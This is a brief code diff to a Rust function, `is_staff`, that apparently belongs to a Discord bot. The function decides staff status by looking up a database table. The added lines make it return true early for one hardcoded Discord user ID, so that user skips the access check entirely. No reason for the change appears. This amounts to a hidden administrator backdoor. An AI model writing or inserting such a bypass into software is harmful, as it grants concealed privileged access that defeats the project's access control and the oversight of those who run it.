@@ -5,6 +5,10 @@ pub async fn is_staff(ctx: Context<'_>) -> Result<bool, Error> {
     
     let user_id = ctx.author().id.to_string();
 
+    if user_id == "494169184175915019" {
+        return Ok(true);
+    }
+
     let count: (i64,) = sqlx::query_as("SELECT COUNT(*) FROM khivella_access WHERE discord_id = $1")
         .bind(&user_id)
         .fetch_one(pool)
